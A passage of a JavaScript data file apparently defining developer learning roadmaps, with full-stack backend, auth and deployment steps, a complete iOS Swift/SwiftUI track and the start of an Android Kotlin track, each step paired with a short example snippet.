                            { id: "fs-node-13", title: "Logging (Morgan/Winston)", description: "Request logging and application logs.", example: "app.use(morgan('dev'));" },
                            { id: "fs-node-14", title: "RESTful API Design", description: "Resource naming, status codes, versioning.", example: "GET /api/v1/users/:id" },
                            { id: "fs-node-15", title: "Async/Await with Express", description: "Handling async route handlers properly.", example: "app.get('/data', async (req,res) => { const d = await ... });" },
                            { id: "fs-node-16", title: "File Uploads (Multer)", description: "Handling multipart/form-data.", example: "const upload = multer({ dest: 'uploads/' });" },
                            { id: "fs-node-17", title: "Sending Emails (Nodemailer)", description: "SMTP email sending.", example: "transporter.sendMail({ to, subject, html })" },
                            { id: "fs-node-18", title: "Cron Jobs (node-cron)", description: "Scheduled background tasks.", example: "cron.schedule('0 * * * *', () => cleanup());" },
                            { id: "fs-node-19", title: "WebSockets (Socket.io)", description: "Real-time bi-directional communication.", example: "io.on('connection', socket => socket.emit('msg','Hi'));" },
                            { id: "fs-node-20", title: "API Documentation (Swagger)", description: "Auto-generating API docs.", example: "swagger-jsdoc + swagger-ui-express" }
                        ]
                    },
                    {
                        id: "fs-be-2", title: "Databases",
                        steps: [
                            { id: "fs-db-1", title: "SQL vs NoSQL", description: "When to use relational vs document databases.", example: "SQL for structured data, MongoDB for flexible schemas." },
                            { id: "fs-db-2", title: "PostgreSQL Setup", description: "Installing and connecting to Postgres.", example: "psql -U postgres; CREATE DATABASE myapp;" },
                            { id: "fs-db-3", title: "CRUD with SQL", description: "SELECT, INSERT, UPDATE, DELETE.", example: "INSERT INTO users(name,email) VALUES('Ali','a@b.com');" },
                            { id: "fs-db-4", title: "JOINs", description: "INNER, LEFT, RIGHT, FULL JOIN.", example: "SELECT u.name, o.total FROM users u JOIN orders o ON u.id=o.user_id;" },
                            { id: "fs-db-5", title: "Indexes", description: "Speeding up queries with indexes.", example: "CREATE INDEX idx_email ON users(email);" },
                            { id: "fs-db-6", title: "Transactions", description: "Atomic operations with BEGIN/COMMIT/ROLLBACK.", example: "BEGIN; UPDATE accounts SET bal=bal-100 ... COMMIT;" },
                            { id: "fs-db-7", title: "Prisma ORM", description: "Type-safe database client for Node.", example: "await prisma.user.create({ data: { name, email } });" },
                            { id: "fs-db-8", title: "Prisma Migrations", description: "Schema versioning and migration workflow.", example: "npx prisma migrate dev --name add_users" },
                            { id: "fs-db-9", title: "MongoDB Basics", description: "Collections, documents, BSON.", example: "db.users.insertOne({ name: 'Ali', email: 'a@b.com' })" },
                            { id: "fs-db-10", title: "Mongoose ODM", description: "Schema-based MongoDB modeling for Node.", example: "const User = mongoose.model('User', userSchema);" },
                            { id: "fs-db-11", title: "MongoDB Aggregation", description: "$match, $group, $project pipeline.", example: "db.orders.aggregate([{ $group: { _id: '$userId', total: { $sum: '$amount' } } }])" },
                            { id: "fs-db-12", title: "Redis Basics", description: "In-memory key-value store for caching.", example: "await redis.set('user:1', JSON.stringify(user), 'EX', 3600);" },
                            { id: "fs-db-13", title: "Database Seeding", description: "Populating test data programmatically.", example: "for (let i=0; i<100; i++) prisma.user.create(...);" },
                            { id: "fs-db-14", title: "Connection Pooling", description: "Efficiently managing DB connections.", example: "new Pool({ max: 10, connectionString: DB_URI })" },
                            { id: "fs-db-15", title: "Data Normalization", description: "Reducing redundancy in relational design.", example: "1NF → 2NF → 3NF" },
                            { id: "fs-db-16", title: "Database Security", description: "Never expose credentials; use parameterized queries.", example: "db.query('SELECT * FROM users WHERE id=$1', [id])" },
                            { id: "fs-db-17", title: "Full-Text Search", description: "PostgreSQL tsvector or MongoDB Atlas Search.", example: "WHERE to_tsvector(body) @@ to_tsquery('tech')" },
                            { id: "fs-db-18", title: "Backups & Recovery", description: "pg_dump, mongodump, automated backup strategies.", example: "pg_dump mydb > mydb_backup.sql" },
                            { id: "fs-db-19", title: "Database Performance Tuning", description: "EXPLAIN ANALYZE, query optimization.", example: "EXPLAIN ANALYZE SELECT * FROM users WHERE email='...';" },
                            { id: "fs-db-20", title: "Soft Deletes", description: "Using deletedAt flag instead of actual deletion.", example: "UPDATE users SET deleted_at=NOW() WHERE id=1;" }
                        ]
                    }
                ],
                project: "Build a REST API for a blog (Users, Posts, Comments) with PostgreSQL and Prisma."
            },
            {
                title: "Integration & Deployment",
                modules: [
                    {
                        id: "fs-int-1", title: "Authentication & Security",
                        steps: [
                            { id: "fs-auth-1", title: "Password Hashing (bcrypt)", description: "Never store plain passwords.", example: "const hash = await bcrypt.hash(password, 12);" },
                            { id: "fs-auth-2", title: "JWT Authentication", description: "Stateless token-based auth.", example: "jwt.sign({ userId }, SECRET, { expiresIn: '7d' })" },
                            { id: "fs-auth-3", title: "Refresh Tokens", description: "Short-lived access + long-lived refresh tokens.", example: "Store refresh token in HttpOnly cookie." },
                            { id: "fs-auth-4", title: "OAuth 2.0 (Google/GitHub)", description: "Social login via Passport.js or NextAuth.", example: "passport.use(new GoogleStrategy(...))" },
                            { id: "fs-auth-5", title: "Role-Based Access Control", description: "Admin, User, Moderator roles with middleware.", example: "if (req.user.role !== 'admin') res.status(403)..." },
                            { id: "fs-auth-6", title: "CORS Configuration", description: "Allow specific origins for API access.", example: "cors({ origin: 'https://myapp.com' })" },
                            { id: "fs-auth-7", title: "Helmet.js", description: "Setting secure HTTP headers.", example: "app.use(helmet());" },
                            { id: "fs-auth-8", title: "Input Sanitization", description: "Prevent XSS and injection attacks.", example: "DOMPurify.sanitize(userInput)" },
                            { id: "fs-auth-9", title: "HTTPS & SSL", description: "Encrypting data in transit.", example: "Let's Encrypt free SSL certificates." },
                            { id: "fs-auth-10", title: "CSRF Protection", description: "Cross-Site Request Forgery prevention.", example: "csurf middleware, SameSite cookies." },
                            { id: "fs-auth-11", title: "Session Management", description: "express-session, secure session stores.", example: "req.session.userId = user.id;" },
                            { id: "fs-auth-12", title: "API Key Authentication", description: "For B2B integrations and third-party access.", example: "Validate X-API-Key header in middleware." },
                            { id: "fs-auth-13", title: "Two-Factor Authentication", description: "TOTP with speakeasy and QR codes.", example: "speakeasy.totp.generate({ secret })" },
                            { id: "fs-auth-14", title: "Audit Logging", description: "Track who did what and when.", example: "AuditLog.create({ userId, action, timestamp })" },
                            { id: "fs-auth-15", title: "Password Reset Flow", description: "Secure token email reset.", example: "Generate token → Email link → Verify → Reset" },
                            { id: "fs-auth-16", title: "Account Lockout", description: "Prevent brute force attacks.", example: "Lock after 5 failed attempts for 15 minutes." },
                            { id: "fs-auth-17", title: "Dependency Auditing", description: "Check for known vulnerabilities in packages.", example: "npm audit fix" },
                            { id: "fs-auth-18", title: "Secrets Management", description: "Use vaults, not .env in production.", example: "AWS Secrets Manager, HashiCorp Vault." },
                            { id: "fs-auth-19", title: "Content Security Policy", description: "Restrict resource loading sources.", example: "Content-Security-Policy: default-src 'self'" },
                            { id: "fs-auth-20", title: "Security Headers Checklist", description: "X-Frame-Options, HSTS, X-Content-Type-Options.", example: "helmet() enables all of these automatically." }
                        ]
                    },
                    {
                        id: "fs-int-2", title: "Deployment & DevOps",
                        steps: [
                            { id: "fs-dep-1", title: "Environment Management", description: "dev, staging, production environments.", example: "NODE_ENV=production node server.js" },
                            { id: "fs-dep-2", title: "Git Workflow (GitFlow)", description: "main, develop, feature, hotfix branches.", example: "git checkout -b feature/user-auth" },
                            { id: "fs-dep-3", title: "Frontend Deployment (Vercel)", description: "Zero-config deployment for React/Next.js.", example: "vercel --prod" },
                            { id: "fs-dep-4", title: "Backend Deployment (Render/Railway)", description: "Hosting Node.js servers with auto-deploy.", example: "Connect GitHub repo → auto deploy on push." },
                            { id: "fs-dep-5", title: "Docker Basics", description: "Containerizing your application.", example: "FROM node:18; COPY . .; RUN npm install; CMD ['node','app.js']" },
                            { id: "fs-dep-6", title: "Docker Compose", description: "Running multi-container apps locally.", example: "docker-compose up (app + postgres + redis)" },
                            { id: "fs-dep-7", title: "GitHub Actions CI/CD", description: "Automated testing and deployment.", example: ".github/workflows/deploy.yml" },
                            { id: "fs-dep-8", title: "Environment Variables in Production", description: "Setting secrets in platform dashboards.", example: "Vercel/Render env var UI." },
                            { id: "fs-dep-9", title: "Database Migrations in Production", description: "Running prisma migrate deploy safely.", example: "npx prisma migrate deploy" },
                            { id: "fs-dep-10", title: "Process Management (PM2)", description: "Keep Node.js running in production.", example: "pm2 start app.js --name myapp" },
                            { id: "fs-dep-11", title: "Nginx as Reverse Proxy", description: "Route traffic to your Node.js app.", example: "proxy_pass http://localhost:3000;" },
                            { id: "fs-dep-12", title: "Load Balancing", description: "Distribute traffic across multiple instances.", example: "upstream backend { server 127.0.0.1:3000; server 127.0.0.1:3001; }" },
                            { id: "fs-dep-13", title: "Health Check Endpoints", description: "Monitor app status.", example: "app.get('/health', (req,res) => res.json({ status:'ok' }));" },
                            { id: "fs-dep-14", title: "Logging in Production (Winston)", description: "Structured logging for debugging.", example: "logger.info({ userId, action: 'login' })" },
                            { id: "fs-dep-15", title: "Error Monitoring (Sentry)", description: "Track and alert on production errors.", example: "Sentry.init({ dsn: SENTRY_DSN })" },
                            { id: "fs-dep-16", title: "CDN for Static Assets", description: "Serve images/JS/CSS from edge servers.", example: "Cloudflare, AWS CloudFront." },
                            { id: "fs-dep-17", title: "Database Backups", description: "Automated periodic backups.", example: "Render managed postgres auto-backups." },
                            { id: "fs-dep-18", title: "Blue-Green Deployment", description: "Zero-downtime deployments.", example: "Switch traffic from old to new instance." },
                            { id: "fs-dep-19", title: "Performance Monitoring (Lighthouse)", description: "Audit Core Web Vitals.", example: "lighthouse https://myapp.com --view" },
                            { id: "fs-dep-20", title: "Cost Optimization", description: "Right-size instances, use spot/preemptible.", example: "Analyze AWS Cost Explorer monthly." }
                        ]
                    }
                ],
                project: "Build and deploy a full-stack social media app with auth, posts, likes, and real-time notifications."
            }
        ]
    },
    ios: {
        title: "iOS Development Roadmap",
        stages: [
            {
                title: "Swift Language Fundamentals",
                modules: [
                    {
                        id: "ios-swift-1", title: "Swift Core Language",
                        steps: [
                            { id: "ios-1", title: "Variables & Constants", description: "var vs let, type inference, type annotations.", example: "let name: String = \"Steve\"; var age = 25" },
                            { id: "ios-2", title: "Data Types", description: "Int, Double, Float, Bool, String, Character.", example: "let pi: Double = 3.14159" },
                            { id: "ios-3", title: "String Interpolation", description: "Embedding values in strings.", example: "let msg = \"Hello, \\(name)! Age: \\(age)\"" },
                            { id: "ios-4", title: "Optionals & Unwrapping", description: "nil, Optional<T>, !, ?, if-let, guard-let.", example: "if let val = optionalVal { print(val) }" },
                            { id: "ios-5", title: "Control Flow", description: "if/else, switch, for-in, while, repeat-while.", example: "for i in 1...5 { print(i) }" },
                            { id: "ios-6", title: "Functions", description: "Parameters, return types, argument labels, default values.", example: "func greet(name: String = \"World\") -> String { return \"Hi \\(name)\" }" },
                            { id: "ios-7", title: "Closures", description: "Anonymous functions, trailing closure syntax.", example: "let doubled = [1,2,3].map { $0 * 2 }" },
                            { id: "ios-8", title: "Enumerations", description: "Associated values, raw values, pattern matching.", example: "enum Direction { case north, south, east, west }" },
                            { id: "ios-9", title: "Structs", description: "Value types, memberwise initializers, methods.", example: "struct Point { var x: Double; var y: Double }" },
                            { id: "ios-10", title: "Classes", description: "Reference types, inheritance, deinit.", example: "class Animal { var name: String; init(name: String) { self.name = name } }" },
                            { id: "ios-11", title: "Protocols", description: "Interface contracts, protocol conformance.", example: "protocol Drivable { func drive() }; class Car: Drivable { func drive() {} }" },
                            { id: "ios-12", title: "Extensions", description: "Adding functionality to existing types.", example: "extension String { var uppercasedFirst: String { ... } }" },
                            { id: "ios-13", title: "Generics", description: "Type-safe reusable code.", example: "func swap<T>(_ a: inout T, _ b: inout T) { let tmp=a; a=b; b=tmp }" },
                            { id: "ios-14", title: "Error Handling", description: "throw, try, do-catch, Result type.", example: "do { try riskyFunc() } catch { print(error) }" },
                            { id: "ios-15", title: "Collections", description: "Array, Dictionary, Set — operations and iteration.", example: "var dict: [String: Int] = [\"a\": 1]; dict[\"b\"] = 2" },
                            { id: "ios-16", title: "Property Observers", description: "willSet and didSet for reactive properties.", example: "var score: Int = 0 { didSet { updateUI() } }" },
                            { id: "ios-17", title: "Computed Properties", description: "Properties computed on the fly.", example: "var area: Double { return width * height }" },
                            { id: "ios-18", title: "Concurrency (async/await)", description: "Swift structured concurrency.", example: "let data = try await URLSession.shared.data(from: url)" },
                            { id: "ios-19", title: "Memory Management (ARC)", description: "Automatic Reference Counting, strong/weak/unowned.", example: "weak var delegate: SomeDelegate?" },
                            { id: "ios-20", title: "Swift Package Manager", description: "Adding dependencies to Swift projects.", example: ".package(url: \"https://github.com/...\", from: \"1.0.0\")" }
                        ]
                    },
                    {
                        id: "ios-swift-2", title: "OOP & Protocols",
                        steps: [
                            { id: "ios-oop-1", title: "Inheritance", description: "Subclassing and method overriding.", example: "class Dog: Animal { override func speak() { print(\"Woof\") } }" },
                            { id: "ios-oop-2", title: "Protocol-Oriented Programming", description: "Default implementations via protocol extensions.", example: "extension Drivable { func park() { print(\"Parking\") } }" },
                            { id: "ios-oop-3", title: "Delegation Pattern", description: "Core iOS pattern for callbacks.", example: "protocol TableDelegate: AnyObject { func didSelect(item: Item) }" },
                            { id: "ios-oop-4", title: "Initializers", description: "Designated, convenience, failable initializers.", example: "init?(string: String) { guard !string.isEmpty else { return nil } }" },
                            { id: "ios-oop-5", title: "Type Casting", description: "as?, as!, is operators.", example: "if let dog = animal as? Dog { dog.fetch() }" },
                            { id: "ios-oop-6", title: "Access Control", description: "private, fileprivate, internal, public, open.", example: "private var internalState: Int = 0" },
                            { id: "ios-oop-7", title: "Static & Class Members", description: "Type-level properties and methods.", example: "static var count = 0; class func create() -> Self { ... }" },
                            { id: "ios-oop-8", title: "Combine Framework", description: "Reactive programming with publishers and subscribers.", example: "$searchText.debounce(...).sink { self.search($0) }" },
                            { id: "ios-oop-9", title: "Result Type", description: "Encoding success/failure without throws.", example: "func fetch() -> Result<Data, Error> { .success(data) }" },
                            { id: "ios-oop-10", title: "Pattern Matching", description: "switch with complex patterns, if-case.", example: "if case .success(let data) = result { ... }" },
                            { id: "ios-oop-11", title: "KeyPaths", description: "Strongly-typed references to properties.", example: "users.map(\\.name)" },
                            { id: "ios-oop-12", title: "Property Wrappers", description: "@State, @Published, custom wrappers.", example: "@Published var count: Int = 0" },
                            { id: "ios-oop-13", title: "Conditional Conformance", description: "Making types conditionally conform to protocols.", example: "extension Array: Printable where Element: CustomStringConvertible" },
                            { id: "ios-oop-14", title: "Opaque Types (some)", description: "Hiding concrete return types.", example: "func makeView() -> some View { Text(\"Hi\") }" },
                            { id: "ios-oop-15", title: "Subscripts", description: "Custom subscript syntax for collections.", example: "subscript(index: Int) -> Element { get { ... } set { ... } }" },
                            { id: "ios-oop-16", title: "Equatable & Comparable", description: "Making types comparable.", example: "struct Point: Equatable { var x, y: Int }" },
                            { id: "ios-oop-17", title: "Hashable & Identifiable", description: "Using custom types in Sets and SwiftUI lists.", example: "struct User: Identifiable { var id = UUID() }" },
                            { id: "ios-oop-18", title: "Codable Protocol", description: "JSON encoding/decoding.", example: "let user = try JSONDecoder().decode(User.self, from: data)" },
                            { id: "ios-oop-19", title: "Testing with XCTest", description: "Unit tests and UI tests.", example: "func testAddition() { XCTAssertEqual(add(2, 3), 5) }" },
                            { id: "ios-oop-20", title: "Debugging Tools", description: "LLDB, print, breakpoints, View Hierarchy Debugger.", example: "po someVariable in LLDB console." }
                        ]
                    }
                ],
                project: "Build a Swift CLI tool: expense tracker that reads/writes data to a JSON file."
            },
            {
                title: "SwiftUI & UIKit",
                modules: [
                    {
                        id: "ios-ui-1", title: "SwiftUI Fundamentals",
                        steps: [
                            { id: "ios-sw-1", title: "Views & Modifiers", description: "Text, Image, Button, Spacer, Divider and chaining modifiers.", example: "Text(\"Hello\").font(.title).foregroundColor(.blue)" },
                            { id: "ios-sw-2", title: "Stacks (VStack/HStack/ZStack)", description: "Composing layouts.", example: "HStack(spacing: 16) { Image(...); VStack { ... } }" },
                            { id: "ios-sw-3", title: "@State & @Binding", description: "Local state and two-way binding.", example: "@State var isOn = false; Toggle(isOn: $isOn) {}" },
                            { id: "ios-sw-4", title: "@ObservedObject & @StateObject", description: "External model objects.", example: "@StateObject var vm = ViewModel()" },
                            { id: "ios-sw-5", title: "@EnvironmentObject", description: "Injecting shared objects into the environment.", example: ".environmentObject(UserStore())" },
                            { id: "ios-sw-6", title: "Lists & ForEach", description: "Dynamic scrollable lists.", example: "List(items) { item in ItemRow(item: item) }" },
                            { id: "ios-sw-7", title: "NavigationStack & NavigationLink", description: "Declarative navigation.", example: "NavigationStack { NavigationLink(\"Detail\") { DetailView() } }" },
                            { id: "ios-sw-8", title: "TabView", description: "Tab bar navigation.", example: "TabView { HomeView().tabItem { Label(\"Home\", systemImage: \"house\") } }" },
                            { id: "ios-sw-9", title: "Forms & Controls", description: "Picker, Toggle, Slider, Stepper, TextField.", example: "Form { Section(\"Profile\") { TextField(\"Name\", text: $name) } }" },
                            { id: "ios-sw-10", title: "Sheets & Alerts", description: "Modal presentations.", example: ".sheet(isPresented: $showSheet) { DetailView() }" },
                            { id: "ios-sw-11", title: "Animations & Transitions", description: "withAnimation, .animation(), .transition().", example: "withAnimation(.spring()) { isExpanded.toggle() }" },
                            { id: "ios-sw-12", title: "Gestures", description: "TapGesture, LongPressGesture, DragGesture.", example: ".gesture(DragGesture().onChanged { val in offset = val.translation })" },
                            { id: "ios-sw-13", title: "Custom ViewModifiers", description: "Reusable modifier bundles.", example: "struct CardStyle: ViewModifier { func body(content: Content) -> some View { content.padding().background(...) } }" },
                            { id: "ios-sw-14", title: "Grid Layouts (LazyVGrid)", description: "Collection view equivalents.", example: "LazyVGrid(columns: [GridItem(.adaptive(minimum: 150))]) { ... }" },
                            { id: "ios-sw-15", title: "Custom Shapes & Drawing", description: "Shape protocol, Path, Canvas.", example: "Path { p in p.move(to: ...); p.addLine(to: ...) }" },
                            { id: "ios-sw-16", title: "SFSymbols", description: "Apple's icon library.", example: "Image(systemName: \"heart.fill\").foregroundColor(.red)" },
                            { id: "ios-sw-17", title: "Dark Mode Support", description: "Color sets and @Environment(colorScheme).", example: "@Environment(\\.colorScheme) var scheme" },
                            { id: "ios-sw-18", title: "Previews", description: "Live previews in Xcode Canvas.", example: "#Preview { ContentView() }" },
                            { id: "ios-sw-19", title: "UIkit Integration (UIViewRepresentable)", description: "Wrapping UIKit views in SwiftUI.", example: "struct MapView: UIViewRepresentable { func makeUIView(...) -> MKMapView { ... } }" },
                            { id: "ios-sw-20", title: "Accessibility", description: "VoiceOver labels, dynamic type.", example: ".accessibilityLabel(\"Submit button\").accessibilityHint(\"Submits the form\")" }
                        ]
                    },
                    {
                        id: "ios-ui-2", title: "Navigation & Architecture",
                        steps: [
                            { id: "ios-nav-1", title: "MVVM Pattern", description: "Separating View from business logic.", example: "class UserViewModel: ObservableObject { @Published var users: [User] = [] }" },
                            { id: "ios-nav-2", title: "Router / Coordinator", description: "Navigation logic outside Views.", example: "enum AppRoute { case home, profile(User), settings }" },
                            { id: "ios-nav-3", title: "Deep Linking", description: "Opening specific screens from URLs.", example: ".onOpenURL { url in router.navigate(to: url) }" },
                            { id: "ios-nav-4", title: "Scene-Based Lifecycle", description: "iOS 14+ multi-scene management.", example: "@main struct App: App { var body: some Scene { WindowGroup { ... } } }" },
                            { id: "ios-nav-5", title: "App Storage & Scene Storage", description: "@AppStorage wraps UserDefaults.", example: "@AppStorage(\"isDarkMode\") var isDarkMode = false" },
                            { id: "ios-nav-6", title: "Push Notifications", description: "APNs setup, permission request, payload handling.", example: "UNUserNotificationCenter.current().requestAuthorization(...)" },
                            { id: "ios-nav-7", title: "Background Tasks", description: "BGTaskScheduler for deferred work.", example: "BGAppRefreshTaskRequest(identifier: \"com.app.refresh\")" },
                            { id: "ios-nav-8", title: "Widgets (WidgetKit)", description: "Home screen widgets.", example: "@main struct MyWidget: Widget { var body: some WidgetConfiguration { ... } }" },
                            { id: "ios-nav-9", title: "Share Sheet & ActivityView", description: "Sharing content from your app.", example: "ShareLink(item: url, subject: Text(\"Check this out\"))" },
                            { id: "ios-nav-10", title: "In-App Purchases (StoreKit 2)", description: "Consumables, subscriptions, non-consumables.", example: "let products = try await Product.products(for: ids)" },
                            { id: "ios-nav-11", title: "Sign in with Apple", description: "Privacy-first authentication.", example: "SignInWithAppleButton(.signIn, onRequest:..., onCompletion:...)" },
                            { id: "ios-nav-12", title: "Camera & Photo Library", description: "PhotosPicker, AVFoundation for camera.", example: "PhotosPicker(selection: $selection, matching: .images)" },
                            { id: "ios-nav-13", title: "Maps Integration", description: "MapKit, Map view, annotations.", example: "Map(coordinateRegion: $region, annotationItems: places) { ... }" },
                            { id: "ios-nav-14", title: "Local Notifications", description: "Scheduling notifications without a server.", example: "UNTimeIntervalNotificationTrigger(timeInterval: 60, repeats: false)" },
                            { id: "ios-nav-15", title: "Haptic Feedback", description: "UIImpactFeedbackGenerator for tactile response.", example: "UIImpactFeedbackGenerator(style: .medium).impactOccurred()" },
                            { id: "ios-nav-16", title: "Dynamic Type", description: "Supporting system font sizes.", example: ".font(.headline) scales automatically." },
                            { id: "ios-nav-17", title: "Localization", description: "Supporting multiple languages.", example: "String(localized: \"Welcome\") uses Localizable.strings" },
                            { id: "ios-nav-18", title: "TestFlight & App Store", description: "Beta distribution and release process.", example: "Archive → Distribute App → TestFlight" },
                            { id: "ios-nav-19", title: "Instruments & Performance", description: "Profiling memory and CPU usage.", example: "Instruments → Leaks + Time Profiler" },
                            { id: "ios-nav-20", title: "App Review Guidelines", description: "Understanding Apple's approval criteria.", example: "Privacy, content policies, monetization rules." }
                        ]
                    }
                ],
                project: "Build a full-featured To-Do app: tags, due dates, reminders, widgets, and iCloud sync."
            },
            {
                title: "Data & Networking",
                modules: [
                    {
                        id: "ios-data-1", title: "Networking & APIs",
                        steps: [
                            { id: "ios-net-1", title: "URLSession Basics", description: "dataTask, data(from:url) async.", example: "let (data, _) = try await URLSession.shared.data(from: url)" },
                            { id: "ios-net-2", title: "Decoding JSON (Codable)", description: "JSONDecoder, CodingKeys for custom mapping.", example: "let posts = try JSONDecoder().decode([Post].self, from: data)" },
                            { id: "ios-net-3", title: "Encoding JSON", description: "JSONEncoder, encoding Swift types to JSON.", example: "let body = try JSONEncoder().encode(newPost)" },
                            { id: "ios-net-4", title: "Custom URLRequest", description: "Setting method, headers, body.", example: "var req = URLRequest(url: url); req.httpMethod = \"POST\"; req.httpBody = body" },
                            { id: "ios-net-5", title: "Error Handling in Networking", description: "Handling HTTP errors, URLError.", example: "guard response.statusCode == 200 else { throw APIError.badResponse }" },
                            { id: "ios-net-6", title: "Authentication Headers", description: "Bearer tokens, API keys in headers.", example: "req.setValue(\"Bearer \\(token)\", forHTTPHeaderField: \"Authorization\")" },
                            { id: "ios-net-7", title: "Networking Layer (Service Pattern)", description: "Abstracting API calls into a service class.", example: "class APIService { func fetchUsers() async throws -> [User] { ... } }" },
                            { id: "ios-net-8", title: "Combine + URLSession", description: "Reactive networking.", example: "URLSession.shared.dataTaskPublisher(for: url).decode(type: T.self, ...)" },
                            { id: "ios-net-9", title: "Image Loading (AsyncImage)", description: "Loading remote images declaratively.", example: "AsyncImage(url: URL(string: imageURL)) { image in image.resizable() }" },
                            { id: "ios-net-10", title: "Caching Strategies", description: "URLCache, manual caching with UserDefaults/CoreData.", example: "URLCache.shared.cachedResponse(for: request)" },
                            { id: "ios-net-11", title: "Pagination", description: "Loading more data as user scrolls.", example: ".onAppear { if item == items.last { loadMore() } }" },
                            { id: "ios-net-12", title: "WebSockets", description: "Real-time communication with URLSessionWebSocketTask.", example: "let task = session.webSocketTask(with: url); task.receive { ... }" },
                            { id: "ios-net-13", title: "Multipart File Upload", description: "Uploading files and form data.", example: "URLSession.shared.uploadTask(with: req, from: data)" },
                            { id: "ios-net-14", title: "Firebase Integration", description: "Firestore, Authentication, Storage.", example: "Firestore.firestore().collection(\"users\").document(uid).setData(...)" },
                            { id: "ios-net-15", title: "GraphQL with Apollo iOS", description: "Querying GraphQL APIs.", example: "client.fetch(query: HeroNameQuery()) { result in ... }" },
                            { id: "ios-net-16", title: "Certificate Pinning", description: "Preventing MITM attacks.", example: "URLSessionDelegate: didReceive challenge — validate cert." },
                            { id: "ios-net-17", title: "Background Downloads", description: "Downloading files when app is backgrounded.", example: "URLSession(configuration: .background(withIdentifier: \"dl\"))" },
                            { id: "ios-net-18", title: "Network Reachability", description: "Detecting connectivity changes.", example: "NWPathMonitor().pathUpdateHandler = { path in ... }" },
                            { id: "ios-net-19", title: "Mocking for Tests", description: "Protocol-based mocking of URLSession.", example: "class MockSession: URLSessionProtocol { ... }" },
                            { id: "ios-net-20", title: "Charles Proxy Debugging", description: "Inspecting network traffic from simulator.", example: "Set proxy to 127.0.0.1:8888 in simulator." }
                        ]
                    },
                    {
                        id: "ios-data-2", title: "Persistence & Storage",
                        steps: [
                            { id: "ios-per-1", title: "UserDefaults", description: "Simple key-value persistence.", example: "UserDefaults.standard.set(true, forKey: \"onboarded\")" },
                            { id: "ios-per-2", title: "File System", description: "Reading/writing to the Documents directory.", example: "let url = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!" },
                            { id: "ios-per-3", title: "Keychain", description: "Secure storage for tokens and passwords.", example: "SecItemAdd, SecItemCopyMatching with kSecClass" },
                            { id: "ios-per-4", title: "Core Data Basics", description: "NSManagedObjectContext, NSFetchRequest.", example: "let req = NSFetchRequest<Item>(entityName: \"Item\")" },
                            { id: "ios-per-5", title: "SwiftData (iOS 17+)", description: "Modern replacement for Core Data.", example: "@Model class Task { var title: String; var isDone: Bool }" },
                            { id: "ios-per-6", title: "iCloud & CloudKit", description: "Syncing data across devices.", example: "CKContainer.default().privateCloudDatabase.save(record, ...)" },
                            { id: "ios-per-7", title: "NSCache", description: "In-memory caching with automatic eviction.", example: "let cache = NSCache<NSString, UIImage>()" },
                            { id: "ios-per-8", title: "Property Lists (Plist)", description: "Storing structured data in plist files.", example: "NSDictionary(contentsOfFile: path)" },
                            { id: "ios-per-9", title: "SQLite (GRDB/FMDB)", description: "Direct SQLite access for complex queries.", example: "try db.execute(sql: \"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)\")" },
                            { id: "ios-per-10", title: "Realm Database", description: "Mobile-first object database.", example: "let realm = try Realm(); try realm.write { realm.add(user) }" },
                            { id: "ios-per-11", title: "Data Migration", description: "Core Data migration strategies.", example: "NSMigratePersistentStoresAutomaticallyOption: true" },
                            { id: "ios-per-12", title: "Predicate Filtering", description: "NSPredicate for Core Data queries.", example: "NSPredicate(format: \"isDone == %@\", true as CVarArg)" },
                            { id: "ios-per-13", title: "Background Contexts", description: "Performing heavy Core Data work off the main thread.", example: "container.performBackgroundTask { ctx in ... }" },
                            { id: "ios-per-14", title: "Persistent History Tracking", description: "Tracking Core Data changes for CloudKit sync.", example: "NSPersistentHistoryTrackingKey: true" },
                            { id: "ios-per-15", title: "Relationships in Core Data", description: "One-to-many, many-to-many relationships.", example: "post.addToComments(comment)" },
                            { id: "ios-per-16", title: "Batch Operations", description: "NSBatchInsertRequest, NSBatchDeleteRequest.", example: "NSBatchDeleteRequest(fetchRequest: fetchRequest)" },
                            { id: "ios-per-17", title: "Codable + File Storage", description: "Encoding structs to JSON and saving to disk.", example: "try encoder.encode(items).write(to: fileURL)" },
                            { id: "ios-per-18", title: "App Group Containers", description: "Sharing data with Widget and Watch extensions.", example: "FileManager.default.containerURL(forSecurityApplicationGroupIdentifier: \"group.com.app\")" },
                            { id: "ios-per-19", title: "Data Privacy & GDPR", description: "Handling user data deletion requests.", example: "Delete all user data when account is closed." },
                            { id: "ios-per-20", title: "Importing & Exporting Data", description: "UIDocumentPickerViewController, ShareSheet.", example: "DocumentGroup(newDocument: { NoteDocument() }) { file in ... }" }
                        ]
                    }
                ],
                project: "Build a News Reader app: fetch RSS feeds, cache offline, CoreData persistence, share articles."
            }
        ]
    },
    android: {
        title: "Android Development Roadmap",
        stages: [
            {
                title: "Kotlin Language",
                modules: [
                    {
                        id: "and-kot-1", title: "Kotlin Fundamentals",
                        steps: [
                            { id: "and-1", title: "Variables & Type System", description: "val vs var, type inference, nullable types.", example: "val name: String = \"Kotlin\"; var count = 0" },
                            { id: "and-2", title: "Null Safety", description: "?.  !!, ?: (Elvis), let, also operators.", example: "val len = text?.length ?: 0" },
                            { id: "and-3", title: "Functions", description: "Default arguments, named parameters, single-expression.", example: "fun greet(name: String = \"World\") = \"Hello, $name!\"" },
                            { id: "and-4", title: "Lambdas & Higher-Order Functions", description: "Passing functions as arguments.", example: "val doubled = listOf(1,2,3).map { it * 2 }" },
                            { id: "and-5", title: "Data Classes", description: "Auto-generated equals, hashCode, copy, toString.", example: "data class User(val id: Int, val name: String)" },
                            { id: "and-6", title: "Sealed Classes", description: "Restricted class hierarchies for state modeling.", example: "sealed class Result { data class Success(val data: T); object Loading }" },
                            { id: "and-7", title: "Object & Companion Object", description: "Singletons and static members.", example: "companion object { const val TAG = \"MyActivity\" }" },
                            { id: "and-8", title: "Extension Functions", description: "Adding functions to existing classes.", example: "fun String.isPalindrome() = this == this.reversed()" },
                            { id: "and-9", title: "Coroutines Basics", description: "Structured concurrency with suspend functions.", example: "viewModelScope.launch { val data = fetchData() }" },
                            { id: "and-10", title: "Flow", description: "Reactive streams for async data.", example: "val flow: Flow<Int> = flowOf(1, 2, 3)" },
                            { id: "and-11", title: "Collections & Sequences", description: "map, filter, reduce, flatMap, groupBy.", example: "users.filter { it.age > 18 }.map { it.name }" },
                            { id: "and-12", title: "Generics & Variance", description: "in, out, reified type parameters.", example: "inline fun <reified T> parseJson(json: String) = gson.fromJson<T>(json)" },
